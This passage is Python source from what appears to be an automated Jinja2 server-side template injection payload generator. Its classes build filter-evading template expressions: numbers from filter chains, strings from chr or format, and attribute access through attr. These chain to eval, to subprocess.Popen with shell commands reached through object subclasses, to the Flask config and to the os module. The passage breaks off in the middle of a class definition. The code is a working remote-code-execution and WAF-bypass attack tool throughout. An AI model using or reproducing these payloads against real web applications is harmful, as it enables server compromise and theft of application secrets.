from .exceptions import *

import abc
import logging
from functools import lru_cache
import re

logger = logging.getLogger("pattern")

vars_dict = {
    "zols": "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}",
    "ltr": "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}",
    "lea": "{%set lea=namespace|escape|urlencode|escape|urlencode|urlencode|urlencode|count%}",
    "lel": "{%set lel=cycler|escape|urlencode|escape|urlencode|escape|urlencode|escape|urlencode|count%}",
    "qo": "{%set qo=namespace|escape|urlencode|escape|urlencode|count%}",
    "bs": "{%set bs=cycler|escape|urlencode|count%}",
    "ab": "{%set ab=namespace|escape|count%}",
    "eq": "{%set eq=cycler|urlencode|count%}",
    "zb": "{%set zb={}|escape|list|escape|count%}",
    "t": "{%set t=joiner|urlencode|wordcount%}",
    "b": "{%set b={}|escape|urlencode|count%}",
    "l": "{%set l={}|escape|first|count%}",
}

vars_str = "".join(vars_dict.values())

number_dict = {
    2015: "zols",
    178: "ltr",
    134: "lea",
    131: "lel",
    90: "qo",
    65: "bs",
    46: "ab",
    26: "zb",
    7: "t",
    6: "b",
    1: "l"
}


def get_int_from_sum(i: int):
    """
    利用number_dict得出可以表达数字i的表达式
    """
    d = [(k, v) for k, v in number_dict.items() if 0 < k <= i]
    d = dict(sorted(d, key=lambda x: x[0], reverse=True))
    ans = []
    for k, v in d.items():
        while k <= i:
            i -= k
            ans.append(v)
    if i:
        return None
    return ans


use_record = {}


class BasePattern(metaclass=abc.ABCMeta):

    def __init__(self):
        self._direct_requirements = []
        self._chosen_pattern = {}
        self._tested = False

    def require(self, pattern_class, *args):
        self._direct_requirements.append((pattern_class, *args))

    def test_requirements(self, test_func):
        chosen_pattern = {}
        for mother_pattern_class, *args in self._direct_requirements:
            subclasses = mother_pattern_class.__subclasses__()
            subclasses = sorted(
                subclasses, key=lambda x: use_record.get(x, 0), reverse=True)
            for pattern_class in subclasses:

                p = pattern_class(*args)

                if not p.test_requirements(test_func):
                    continue
                if not test_func(p.payload):
                    continue

                chosen_pattern[(mother_pattern_class, *args)] = p
                use_record[pattern_class] = use_record.get(
                    pattern_class, 0) + 1
                logger.debug(
                    f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} success"
                )
                break
            else:
                logger.debug(
                    f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} failed, rolling back")
                return False

        self._chosen_pattern = chosen_pattern
        self._tested = True
        return True

    def use(self, mother_pattern_class, *args):
        p = self._chosen_pattern[(mother_pattern_class, *args)]
        return p.payload

    @property
    def requirements(self):
        return self._direct_requirements

    @abc.abstractmethod
    def _generate(self):
        pass

    @property
    @lru_cache(1)
    def payload(self):
        if not self._tested:
            raise NotTested(
                f"{self.__repr__()}: Please use test_requirements function")
        return self._generate()

    def __repr__(self):
        return f"<{self.__class__.__name__}>"


class PlainPattern(BasePattern):
    pass


class PlainPattern1(PlainPattern):
    def __init__(self, s):
        super().__init__()
        self.s = s

    def _generate(self):
        return self.s


class WillErrorPattern(BasePattern):
    pass


class StrConcatPattern(BasePattern):
    pass


class StrConcatPattern1(StrConcatPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "+")

    def _generate(self):
        return "+"


class StrConcatPattern2(StrConcatPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "~")

    def _generate(self):
        return "~"


class ZeroPattern(BasePattern):
    pass


class ZeroPattern1(ZeroPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "0")

    def _generate(self):
        return "0"


class ZeroPattern2(ZeroPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "(g|urlencode|length)")

    def _generate(self):
        return "(g|urlencode|length)"


class ZeroPattern3(ZeroPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "({}|urlencode|count)")

    def _generate(self):
        return "({}|urlencode|count)"


class ZeroPattern4(ZeroPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "({}|int)")

    def _generate(self):
        return "({}|int)"


class PositiveIntPattern(BasePattern):
    pass


should_set_abcd = False


class PositiveIntPattern1(PositiveIntPattern):
    def __init__(self, num: int):
        super().__init__()
        self.num = str(num)
        self.require(PlainPattern, self.num)

    def _generate(self):
        return self.use(PlainPattern, self.num)


class PositiveIntPattern2(PositiveIntPattern):
    def __init__(self, num: int):
        global should_set_abcd
        super().__init__()

        if not should_set_abcd:

            print("You should use:" + vars_str)
            should_set_abcd = True

        # payload = []

        # for i, s in number_dict.items():
        #     while num >= i:
        #         num -= i
        #         payload.append(s)

        payload = get_int_from_sum(num)

        if payload is None:
            self.require(WillErrorPattern)
            return

        self.s = f"({'+'.join(payload)})"

        self.require(PlainPattern, self.s)

    def _generate(self):
        # return "(%s)" % self.use(StrConcatPattern).join(self.s)
        return self.use(PlainPattern, self.s)


class PositiveIntPattern3(PositiveIntPattern):
    def __init__(self, num: int):
        global should_set_abcd
        super().__init__()

        if not should_set_abcd:

            print("You should use:" + vars_str)

            should_set_abcd = True

        payload = get_int_from_sum(num)

        if payload is None:
            self.require(WillErrorPattern)
            return

        payload_str = "".join([f".__add__({s})"for s in payload])

        self.s = "((%s)" + payload_str + ")"
        self.require(ZeroPattern)
        self.require(PlainPattern, self.s)

    def _generate(self):
        return self.s % self.use(ZeroPattern)


class PositiveIntPattern4(PositiveIntPattern):
    def __init__(self, num: int):
        global should_set_abcd
        super().__init__()

        if not should_set_abcd:

            print("You should use:" + vars_str)
            should_set_abcd = True

        payload = get_int_from_sum(num)

        if payload is None:
            self.require(WillErrorPattern)
            return

        payload_str = "".join(
            [f"|attr(\"\\x5f\\x5fadd\\x5f\\x5f\")({s})"for s in payload])

        self.s = "((%s)" + payload_str + ")"

        self.require(PlainPattern, self.s)
        self.require(ZeroPattern)

    def _generate(self):
        return self.s % self.use(ZeroPattern)


class PositiveIntPattern5(PositiveIntPattern):
    def __init__(self, num: int):
        super().__init__()
        self.num = "".join([chr(ord('０') - ord("0") + ord(c))
                           for c in str(num)])
        self.require(PlainPattern, self.num)

    def _generate(self):
        return self.use(PlainPattern, self.num)


class PositiveIntPattern6(PositiveIntPattern):
    def __init__(self, num: int):
        super().__init__()
        if num > max(number_dict.keys()):
            self.require(WillErrorPattern)
            return

        biggest_num = min([i for i in number_dict.keys() if i >= num])

        payload = get_int_from_sum(biggest_num - num)

        if payload is None:
            self.require(WillErrorPattern)
            return

        payload = [number_dict[biggest_num], ] + payload

        self.s = "(" + "-".join(payload) + ")"

        self.require(PlainPattern, self.s)

    def _generate(self):
        return self.s


class SubPositiveIntPattern(BasePattern):
    pass


class SubPositiveIntPattern1(SubPositiveIntPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.require(PlainPattern, "-")
        self.require(PositiveIntPattern, num)

    def _generate(self):
        return "-" + self.use(PositiveIntPattern, self.num)


class SubPositiveIntPattern2(SubPositiveIntPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.pattern = ".__sub__(%s)"
        self.require(PlainPattern, self.pattern.replace("%s", ""))
        self.require(PositiveIntPattern, num)

    def _generate(self):
        return self.pattern % self.use(PositiveIntPattern, self.num)


class NegativeIntPattern(BasePattern):
    pass


class NegativeIntPattern1(NegativeIntPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.require(ZeroPattern)
        self.require(SubPositiveIntPattern, 0-num)

    def _generate(self):
        return "((%s)%s)" % (
            self.use(ZeroPattern),
            self.use(SubPositiveIntPattern, 0-self.num)
        )


class IntPattern(BasePattern):
    pass


class IntPattern1(IntPattern):
    def __init__(self, num):
        super().__init__()
        assert isinstance(num, int)
        self.num = num
        if num > 0:
            self.require(PositiveIntPattern, num)
        elif num < 0:
            self.require(NegativeIntPattern, num)
        else:
            self.require(ZeroPattern)

    def _generate(self):
        if self.num > 0:
            return self.use(PositiveIntPattern, self.num)
        elif self.num < 0:
            return self.use(NegativeIntPattern, self.num)
        else:
            return self.use(ZeroPattern)


class AddIntPattern(BasePattern):
    pass


class AddIntPattern1(AddIntPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.require(PlainPattern, "+")
        self.require(IntPattern, num)

    def _generate(self):
        return "+" + self.use(IntPattern, self.num)


class AddIntPattern2(AddIntPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.pattern = ".__add__(%s)"
        self.require(PlainPattern, self.pattern.replace("%s", ""))
        self.require(IntPattern, num)

    def _generate(self):
        return self.pattern % self.use(IntPattern, self.num)


class SubIntPattern(BasePattern):
    pass


class SubIntPattern1(SubIntPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.require(PlainPattern, "-")
        self.require(IntPattern, num)

    def _generate(self):
        return "-" + self.use(IntPattern, self.num)


class SubIntPattern2(SubIntPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.pattern = ".__sub__(%s)"
        self.require(PlainPattern, self.pattern.replace("%s", ""))
        self.require(IntPattern, num)

    def _generate(self):
        return self.pattern % self.use(IntPattern, self.num)


class PercentSignPattern(BasePattern):
    pass


class PercentSignPattern1(PercentSignPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "'%'")

    def _generate(self):
        return "'%'"


class PercentSignPattern2(PercentSignPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "lipsum()|urlencode|first")

    def _generate(self):
        return "lipsum()|urlencode|first"


class PercentSignPattern3(PercentSignPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "({}|escape|urlencode|first)")

    def _generate(self):
        return "({}|escape|urlencode|first)"


class PercentSignPattern4(PercentSignPattern):
    def __init__(self):
        super().__init__()
        self.pattern = "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))"
        self.require(PlainPattern, self.pattern.replace(
            "2", "").replace("37", ""))
        self.require(IntPattern, 22)
        self.require(IntPattern, 2)
        self.require(IntPattern, 37)

    def _generate(self):
        return self.pattern\
            .replace("22", self.use(IntPattern, 22))\
            .replace("2", self.use(IntPattern, 2))\
            .replace("37", self.use(IntPattern, 37))


class PercentSignPattern5(PercentSignPattern):
    def __init__(self):
        super().__init__()
        self.pattern = "(lipsum|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)((lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)(dict(chr=x)|join)(37))"
        self.require(PlainPattern, self.pattern.replace(
            "2", "").replace("37", ""))
        self.require(IntPattern, 22)
        self.require(IntPattern, 2)
        self.require(IntPattern, 37)

    def _generate(self):
        return self.pattern\
            .replace("22", self.use(IntPattern, 22))\
            .replace("2", self.use(IntPattern, 2))\
            .replace("37", self.use(IntPattern, 37))


class LowerCPattern(BasePattern):
    pass


class LowerCPattern1(LowerCPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "'c'")

    def _generate(self):
        return "'c'"


class LowerCPattern2(LowerCPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "dict(c={})|join".format(""))
        self.require(IntPattern, 1)

    def _generate(self):
        return "dict(c={})|join".format(
            self.use(IntPattern, 1).strip("(").strip(")")
        )


class LowerCPattern3(LowerCPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "lipsum|pprint|first|urlencode|last|lower")

    def _generate(self):
        return "lipsum|pprint|first|urlencode|last|lower"


class LowerCPattern4(LowerCPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "cycler|pprint|first|urlencode|last|lower")

    def _generate(self):
        return "cycler|pprint|first|urlencode|last|lower"


class PercentSignLowerCPattern(BasePattern):
    pass


class PercentSignLowerCPattern1(PercentSignLowerCPattern):
    def __init__(self):
        super().__init__()
        self.require(PercentSignPattern)
        self.require(LowerCPattern)
        self.require(StrConcatPattern)

    def _generate(self):
        return "(" + (
            self.use(PercentSignPattern) +
            self.use(StrConcatPattern) +
            self.use(LowerCPattern)
        ) + ")"


class PercentSignLowerCPattern2(PercentSignLowerCPattern):
    def __init__(self):
        super().__init__()
        self.pattern = "cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower"
        self.require(
            PlainPattern,
            self.pattern.replace("{}", "")
        )
        self.require(IntPattern, 10)
        self.require(IntPattern, 8)

    def _generate(self):
        return self.pattern % (
            self.use(IntPattern, 10),
            self.use(IntPattern, 8)
        )


class ManyPercentSignLowerCPattern(BasePattern):
    pass


class ManyPercentSignLowerCPattern1(ManyPercentSignLowerCPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.require(PercentSignLowerCPattern)
        self.require(PlainPattern, "*")
        self.require(IntPattern, num)

    def _generate(self):
        return "({}*{})".format(
            self.use(PercentSignLowerCPattern),
            self.use(IntPattern, self.num)
        )


class ManyPercentSignLowerCPattern2(ManyPercentSignLowerCPattern):
    def __init__(self, num):
        super().__init__()
        self.num = num
        self.require(PercentSignLowerCPattern)
        self.require(StrConcatPattern)

    def _generate(self):
        return "({})".format(
            self.use(StrConcatPattern).join(
                self.use(PercentSignLowerCPattern) for _ in range(self.num))
        )


class StrPattern(BasePattern):
    pass


class StrPattern01(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.inner_s = inner_s.replace("'", "\\'")
        self.require(PlainPattern, inner_s)
        self.require(PlainPattern, "'")

    def _generate(self):
        return "'" + self.inner_s + "'"


class StrPattern02(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.inner_s = inner_s.replace('"', '\\"')
        self.require(PlainPattern, self.inner_s)
        self.require(PlainPattern, '"')

    def _generate(self):
        return '"' + self.inner_s + '"'


class StrPattern03(StrPattern):
    def __init__(self, inner_s):
        from urllib.parse import quote
        super().__init__()
        self.inner_s = quote(inner_s).replace("%", "\\x")
        self.require(PlainPattern, self.inner_s)
        self.require(PlainPattern, '"')

    def _generate(self):
        return '"' + self.inner_s + '"'


class StrPattern04(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.require(PlainPattern, "'")
        self.require(PlainPattern, "+")
        self.inner_s = inner_s
        for c in inner_s:
            self.require(PlainPattern, c)

    def _generate(self):
        l = ["'" + c.replace("'", "\\'") + "'" for c in self.inner_s]
        return "(%s)" % "+".join(l)


class StrPattern05(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.require(PlainPattern, "\"")
        self.require(PlainPattern, "+")
        self.inner_s = inner_s
        for c in inner_s:
            self.require(PlainPattern, c)

    def _generate(self):
        l = ['"' + c.replace('"', "\\\"") + '"' for c in self.inner_s]
        return "(%s)" % "+".join(l)


class StrPattern06(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.pattern = "('%c'*{})%({})"
        self.require(PlainPattern, self.pattern.replace("{}", ""))
        self.len = len(inner_s)
        self.require(IntPattern, self.len)
        self.numbers = ",".join([str(ord(i)) for i in inner_s])
        self.require(PlainPattern, self.numbers)

    def _generate(self):
        return self.pattern.format(
            self.use(IntPattern, self.len),
            self.numbers
        )


class StrPattern07(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.pattern = "(\"%c\"*{})%({})"
        self.require(PlainPattern, self.pattern.replace("{}", ""))
        self.len = len(inner_s)
        self.require(IntPattern, self.len)
        self.numbers = ",".join([str(ord(i)) for i in inner_s])
        self.require(PlainPattern, self.numbers)

    def _generate(self):
        return self.pattern.format(
            self.use(IntPattern, self.len),
            self.numbers
        )


class StrPattern08(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        import re
        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
            self.require(WillErrorPattern)
            return

        self.inner_s = inner_s

        self.s = "dict({}={})|join"
        self.require(PlainPattern, self.s.replace("{}", ""))
        self.require(PlainPattern, inner_s)
        self.require(IntPattern, 1)

    def _generate(self):
        return self.s.format(
            self.use(PlainPattern, self.inner_s),
            self.use(IntPattern, 1)
        )


class StrPattern09(StrPattern):
    def __init__(self, inner_s):
        super().__init__()

        mid = len(inner_s) // 2
        s_a, s_b = inner_s[:mid], inner_s[mid:]
        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", s_a) or not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", s_b):
            self.require(WillErrorPattern)
            return

        self.s = f"dict({s_a}=%s,{s_b}=%s)|join"
        self.require(PlainPattern, self.s.replace("%s", ""))
        self.require(IntPattern, 1)

    def _generate(self):
        return self.s % (
            self.use(IntPattern, 1),
            self.use(IntPattern, 1)
        )


class StrPattern10(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        import re
        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
            self.require(WillErrorPattern)
            return

        l = [
            "(lipsum|escape|batch({TWENTYTWO})|list|first|last)" if not word else f"dict({word}=cycler)|join"
            for word in inner_s.split("_")
        ]

        self.l = l

        self.require(StrConcatPattern)
        self.require(IntPattern, 22)

    def _generate(self):
        return self\
            .use(StrConcatPattern)\
            .join(self.l)\
            .replace("{TWENTYTWO}", self.use(IntPattern, 22))


class StrPattern11(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
            self.require(WillErrorPattern)
            return

        l = [
            "(()|select|string|batch({TWENTYFIVE})|first|last)" if not word else f"dict({word}=cycler)|join"
            for word in inner_s.split("_")
        ]

        self.l = l

        self.require(StrConcatPattern)
        self.require(IntPattern, 25)

    def _generate(self):
        return self\
            .use(StrConcatPattern)\
            .join(self.l)\
            .replace("{TWENTYFIVE}", self.use(IntPattern, 25))


class StrPattern12(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.inner_s = "".join("\\u00" + hex(ord(c))[2:] for c in inner_s)
        self.require(PlainPattern, self.inner_s)
        self.require(PlainPattern, '"')

    def _generate(self):
        return '"' + self.inner_s + '"'


class StrPattern13(StrPattern):
    def __init__(self, inner_s):
        super().__init__()
        self.inner_s = "".join("\\u00" + hex(ord(c))[2:] for c in inner_s)
        self.require(PlainPattern, self.inner_s)
        self.require(PlainPattern, "'")

    def _generate(self):
        return "'" + self.inner_s + "'"


class StrPattern14(StrPattern):
    def __init__(self, inner_s):
        super().__init__()

        assert len(inner_s)

        self.inner_s = inner_s

        self.pattern = "{}%({})"

        self.require(PlainPattern, self.pattern.replace("{}", ""))

        self.require(ManyPercentSignLowerCPattern, len(self.inner_s))

        for c in inner_s:
            self.require(IntPattern, ord(c))
        self.require(PlainPattern, ",")

        # inner_s_numbers = ",".join([str(ord(c)) for c in inner_s])
        # self.full_s = pattern.format(len(inner_s), inner_s_numbers)
        # self.require(PlainPattern, inner_s_numbers)
        # self.require(PlainPattern, self.full_s)

    def _generate(self):
        numbers = ",".join([
            self.use(IntPattern, ord(c)).strip("(").strip(")")
            for c in self.inner_s
        ])

        return self.pattern.format(
            self.use(ManyPercentSignLowerCPattern, len(self.inner_s)),
            numbers
        )


class StrPattern15(StrPattern):
    def __init__(self, inner_s):
        super().__init__()

        assert len(inner_s)

        self.inner_s = inner_s

        self.pattern = "{}|format({})"

        self.require(PlainPattern, self.pattern.replace("{}", ""))

        self.require(ManyPercentSignLowerCPattern, len(self.inner_s))
        for c in inner_s:
            self.require(IntPattern, ord(c))
        self.require(PlainPattern, ",")

        # inner_s_numbers = ",".join([str(ord(c)) for c in inner_s])
        # self.full_s = pattern.format(len(inner_s), inner_s_numbers)
        # self.require(PlainPattern, inner_s_numbers)
        # self.require(PlainPattern, self.full_s)

    def _generate(self):
        numbers = ",".join([
            self.use(IntPattern, ord(c)).strip("(").strip(")")
            for c in self.inner_s
        ])

        return self.pattern.format(
            self.use(ManyPercentSignLowerCPattern, len(self.inner_s)),
            numbers
        )


class AttrPattern(BasePattern):
    pass


class AttrPattern1(AttrPattern):

    def __init__(self, attr_name):
        super().__init__()
        self.attr_name = attr_name
        self.require(StrPattern, attr_name)
        self.require(PlainPattern, "[")
        self.require(PlainPattern, "]")

    def _generate(self):
        attr_name = self.use(StrPattern, self.attr_name)
        return f"[{attr_name}]"


class AttrPattern2(AttrPattern):
    def __init__(self, attr_name):
        super().__init__()
        self.attr_name = attr_name
        self.require(PlainPattern, ".")
        self.require(PlainPattern, attr_name)

    def _generate(self):
        return "." + self.attr_name


class AttrPattern3(AttrPattern):
    def __init__(self, attr_name):
        super().__init__()
        self.attr_name = attr_name
        self.require(StrPattern, attr_name)
        self.require(PlainPattern, "|attr(")
        self.require(PlainPattern, ")")

    def _generate(self):
        attr_name = self.use(StrPattern, self.attr_name)
        return f"|attr({attr_name})"


# class AttrPattern4(AttrPattern):
#     def __init__(self, attr_name):
#         super().__init__()
#         self.attr_name = attr_name
#         self.require(PlainPattern, attr_name)
#         self.require(PlainPattern, "|attr(")
#         self.require(PlainPattern, ")")

#     def _generate(self):
#         attr_name = self.attr_name
#         return f"|attr({attr_name})"


class ItemPattern(BasePattern):
    pass


class ItemPattern1(ItemPattern):
    def __init__(self, item_name):
        super().__init__()
        self.item_name = item_name
        self.require(PlainPattern, item_name)
        self.require(PlainPattern, ".")

    def _generate(self):
        return "." + self.item_name


class ItemPattern2(ItemPattern):
    def __init__(self, item_name):
        super().__init__()
        self.item_name = item_name
        self.require(StrPattern, item_name)
        self.require(PlainPattern, "[")
        self.require(PlainPattern, "]")

    def _generate(self):
        item_name = self.use(StrPattern, self.item_name)
        return f"[{item_name}]"


class ItemPattern3(ItemPattern):
    def __init__(self, item_name):
        super().__init__()
        self.item_name = item_name
        self.require(AttrPattern, "__getitem__")
        self.require(StrPattern, self.item_name)

    def _generate(self):
        return "%s(%s)" % (
            self.use(AttrPattern, "__getitem__"),
            self.use(StrPattern, self.item_name)
        )


class ConcatedAttrItemPattern(BasePattern):
    pass


class ConcatedAttrItemPattern1(ConcatedAttrItemPattern):
    def __init__(self, inside, tp):
        super().__init__()

        self.tp = tp
        self.inside = inside

        self.require(PlainPattern, "()")

        if isinstance(inside, str):
            self.require(PlainPattern, inside)
        elif isinstance(inside, tuple):
            assert BasePattern in inside[0].__mro__
            self.require(inside[0], *inside[1:])

        for PatternType, *args in self.tp:
            self.require(PatternType, *args)

    def _generate(self):

        if isinstance(self.inside, str):
            inside = self.use(PlainPattern, self.inside)
        elif isinstance(self.inside, tuple):
            inside = self.use(self.inside[0], *self.inside[1:])
        else:
            raise Exception("Unknown Error")
        s = inside
        c = ""
        for PatternType, *args in self.tp:
            append = self.use(PatternType, *args)
            if not c or c == append[0]:
                s += append
            else:
                s = "(%s)%s" % (s, append)
            c = append[0]
        return "(%s)" % s


class ClassAttrPattern(BasePattern):
    pass


class ClassAttrPattern1(ClassAttrPattern):
    def __init__(self, attr_name):
        super().__init__()
        self.s = ".__class__." + attr_name
        self.require(PlainPattern, self.s)

    def _generate(self):
        return self.s


class ClassAttrPattern2(ClassAttrPattern):
    def __init__(self, attr_name):
        super().__init__()
        self.attr_name = attr_name
        self.require(PlainPattern, "|attr(%s)|attr(%s)".replace("%s", ""))
        self.require(StrPattern, "__class__")
        self.require(StrPattern, attr_name)

    def _generate(self):
        return "|attr(%s)|attr(%s)" % (
            self.use(StrPattern, "__class__"),
            self.use(StrPattern, self.attr_name)
        )


class EvalPattern(BasePattern):
    pass


class EvalPattern1(EvalPattern):
    def __init__(self, oneline_code):
        super().__init__()
        self.oneline_code = oneline_code
        self.require(PlainPattern, "()")
        self.require(ConcatedAttrItemPattern, "lipsum", (
            (AttrPattern, "__globals__"),
            (ItemPattern, "__builtins__"),
            (ItemPattern, "eval"),
        ))
        self.require(StrPattern, self.oneline_code)

    def _generate(self):
        return "(%s)(%s)" % (
            self.use(ConcatedAttrItemPattern, "lipsum", (
                (AttrPattern, "__globals__"),
                (ItemPattern, "__builtins__"),
                (ItemPattern, "eval"),
            )),
            self.use(StrPattern, self.oneline_code)
        )


class EvalPattern2(EvalPattern):
    def __init__(self, oneline_code):
        super().__init__()
        self.oneline_code = oneline_code
        self.require(PlainPattern, "()")
        self.require(ConcatedAttrItemPattern, "joiner", (
            (AttrPattern, "__init__"),
            (AttrPattern, "__globals__"),
            (ItemPattern, "__builtins__"),
            (ItemPattern, "eval"),
        ))
        self.require(StrPattern, self.oneline_code)

    def _generate(self):
        return "(%s)(%s)" % (
            self.use(ConcatedAttrItemPattern, "joiner", (
                (AttrPattern, "__init__"),
                (AttrPattern, "__globals__"),
                (ItemPattern, "__builtins__"),
                (ItemPattern, "eval"),
            )),
            self.use(StrPattern, self.oneline_code)
        )


class EvalPattern3(EvalPattern):
    def __init__(self, oneline_code):
        super().__init__()
        self.oneline_code = oneline_code
        self.require(PlainPattern, "()")
        self.require(ConcatedAttrItemPattern, "x", (
            (AttrPattern, "__init__"),
            (AttrPattern, "__globals__"),
            (ItemPattern, "__builtins__"),
            (ItemPattern, "eval"),
        ))
        self.require(StrPattern, self.oneline_code)

    def _generate(self):
        return "(%s)(%s)" % (
            self.use(ConcatedAttrItemPattern, "x", (
                (AttrPattern, "__init__"),
                (AttrPattern, "__globals__"),
                (ItemPattern, "__builtins__"),
                (ItemPattern, "eval"),
            )),
            self.use(StrPattern, self.oneline_code)
        )


class SubclassesPattern(BasePattern):
    pass


class SubclassesPattern1(SubclassesPattern):
    def __init__(self):
        super().__init__()
        self.require(ClassAttrPattern, "__mro__")
        self.require(PlainPattern, "|last")
        self.require(AttrPattern, "__subclasses__")
        self.require(PlainPattern, "()")
        self.require(PlainPattern, "{}")

    def _generate(self):
        return "({}%s)%s" % (
            self.use(ClassAttrPattern, "__mro__") +
            "|last",
            self.use(AttrPattern, "__subclasses__") +
            "()"
        )


class SubprocessPopenClassPattern(BasePattern):
    pass


class SubprocessPopenClassPattern1(SubprocessPopenClassPattern):
    def __init__(self):
        super().__init__()

        self.count_pattern = "((%s|string)[:(%s|string)%s(%s)])%s(%s)"
        self.require(PlainPattern, self.count_pattern.replace("%s", ""))
        self.require(SubclassesPattern)
        self.require(AttrPattern, "find")
        self.require(StrPattern, "Popen")
        self.require(AttrPattern, "count")
        self.require(StrPattern, ">, <")

        self.pattern = "(%s)[%s]"
        self.require(PlainPattern, self.pattern.replace("%s", ""))

    def _generate(self):
        count = self.count_pattern % (
            self.use(SubclassesPattern),
            self.use(SubclassesPattern),
            self.use(AttrPattern, "find"),
            self.use(StrPattern, "Popen"),
            self.use(AttrPattern, "count"),
            self.use(StrPattern, ">, <")
        )
        return self.pattern % (
            self.use(SubclassesPattern),
            count,
        )


class SubprocessPopenPattern(BasePattern):
    pass


class SubprocessPopenPattern1(SubprocessPopenPattern):
    def __init__(self, cmd):
        super().__init__()
        self.cmd = cmd
        self.pattern = "(%s(%s,shell=%s,stdout=%s)%s)%s"
        self.require(PlainPattern, self.pattern.replace("%s", ""))
        self.require(SubprocessPopenClassPattern)
        self.require(StrPattern, cmd)
        self.require(IntPattern, 1)
        self.require(IntPattern, -1)
        self.require(AttrPattern, "communicate")
        self.require(PlainPattern, "()|first")

    def _generate(self):
        return self.pattern % (
            self.use(SubprocessPopenClassPattern),
            self.use(StrPattern, self.cmd),
            self.use(IntPattern, 1),
            self.use(IntPattern, -1),
            self.use(AttrPattern, "communicate"),
            "()|first"
        )


class ConfigPattern(BasePattern):
    pass


class ConfigPattern1(ConfigPattern):
    def __init__(self):
        super().__init__()
        self.require(PlainPattern, "config")

    def _generate(self):
        return "config"

# self.__dict__._TemplateReference__context.config


class ConfigPattern2(ConfigPattern):
    def __init__(self):
        super().__init__()
        self.require(ConcatedAttrItemPattern, "self", (
            (AttrPattern, "__dict__"),
            (ItemPattern, "_TemplateReference__context"),
            (ItemPattern, "config"),
        ))

    def _generate(self):
        return self.use(ConcatedAttrItemPattern, "self", (
            (AttrPattern, "__dict__"),
            (ItemPattern, "_TemplateReference__context"),
            (ItemPattern, "config"),
        ))


class ConfigPattern3(ConfigPattern):
    def __init__(self):
        super().__init__()
        self.require(ConcatedAttrItemPattern, "request", (
            (AttrPattern, "application"),
            (AttrPattern, "__self__"),
            (AttrPattern, "json_module"),
            (AttrPattern, "JSONEncoder"),
            (AttrPattern, "default"),
            (AttrPattern, "__globals__"),
            (ItemPattern, "current_app"),
            (AttrPattern, "config"),
        ))

    def _generate(self):

        return self.use(ConcatedAttrItemPattern, "request", (
            (AttrPattern, "application"),
            (AttrPattern, "__self__"),
            (AttrPattern, "json_module"),
            (AttrPattern, "JSONEncoder"),
            (AttrPattern, "default"),
            (AttrPattern, "__globals__"),
            (ItemPattern, "current_app"),
            (AttrPattern, "config"),
        ))


class ModOSPattern(BasePattern):
    pass


class ModOSPattern1(ModOSPattern):
    def __init__(self):
        super().__init__()
        self.require(ConcatedAttrItemPattern, (ConfigPattern, ), (
            (ClassAttrPattern, "__init__"),
            (AttrPattern, "__globals__"),
            (ItemPattern, "os"),
        ))

    def _generate(self):
        return self.use(ConcatedAttrItemPattern, (ConfigPattern, ), (
            (ClassAttrPattern, "__init__"),
            (AttrPattern, "__globals__"),
            (ItemPattern, "os"),
        ))


class ModOSPattern2(ModOSPattern):
    def __init__(self):
        super().__init__()
        self.require(ConcatedAttrItemPattern, "url_for", (
            (AttrPattern, "__globals__"),
            (ItemPattern, "os")
        ))

    def _generate(self):
        return self.use(ConcatedAttrItemPattern, "url_for", (
            (AttrPattern, "__globals__"),
            (ItemPattern, "os")
        ))


class ModOSPattern3(ModOSPattern):
    def __init__(self):
        super().__init__()
